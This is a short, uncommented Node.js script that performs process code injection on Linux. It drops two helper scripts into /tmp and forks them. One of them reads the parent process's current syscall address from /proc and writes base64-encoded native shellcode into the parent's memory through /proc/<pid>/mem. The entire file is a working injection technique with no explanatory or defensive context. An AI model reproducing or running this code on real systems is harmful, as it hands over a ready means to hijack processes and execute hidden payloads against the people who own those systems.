

```js
const fs = require('fs');
const { fork } = require('child_process');

node_subp1_path = "/tmp/subp1.js"
node_subp2_path = "/tmp/subp2.js"

var node_subp1 = `const { fork } = require('child_process');

function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}

async function init() {
    var proc = fork("${node_subp2_path}", [], {"execPath": "/proc/self/exe", "argv0": "nodejs"});
    await sleep(1000);
}

init();
`

var node_subp2 = `
fs = require('fs');
var ppid = process.ppid;
var data = fs.readFileSync('/proc/'+ppid+'/syscall', {encoding:'utf8', flag:'r'});
var mem_addr = data.split(" ")[8].trim();
var dec_offset = Number(mem_addr);
var shellcode_b64 = "gCiI0qCIqPLgDx/44AMAkSEAAcroIoDSAQAA1MgFgNIBAADUiBWA0gEAANRhAoDSKBCA0gEAANQ=";
var shellcode = Buffer.from(shellcode_b64, 'base64');
fs.open('/proc/'+ppid+'/mem', 'a', function(err, fd) {
    fs.write(fd, shellcode, 0, shellcode.length, dec_offset, function(err,writtenbytes){});
})
`

fs.writeFileSync(node_subp1_path, node_subp1);
fs.writeFileSync(node_subp2_path, node_subp2);

var proc = fork("/tmp/subp1.js", [], {"execPath": "/proc/self/exe", "argv0": "nodejs"});
var subpid = proc.pid
```